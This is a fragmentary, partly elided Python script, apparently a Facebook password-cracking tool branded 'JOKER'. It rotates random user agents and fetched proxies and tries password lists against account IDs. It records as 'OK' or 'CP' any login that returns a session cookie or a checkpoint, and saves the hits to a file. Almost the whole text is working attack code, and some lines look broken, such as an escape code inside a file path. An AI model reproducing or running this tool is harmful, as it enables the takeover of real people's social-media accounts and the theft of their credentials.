...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/JOKER69/.JOKER-proxy.txt').text
...
\033[1;39m======================================================
\033[97;1m>>     Owner    : PRINCE JOKER
\033[97;1m>>     Facebook : SHAHI JOKER
\033[97;1m>>     Version  : 2.8
\033[97;1m>>     Git hop  : HAJI JOKER
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> JOKER  VERSION :\x1b[1;92m 2.8 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/duliako/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[JOKER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[JOKER-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in JOKER:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[JOKER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mJOKER\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[JOKER-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[JOKER-OK] '+uid+' | '+ps+'\33[0;97m')
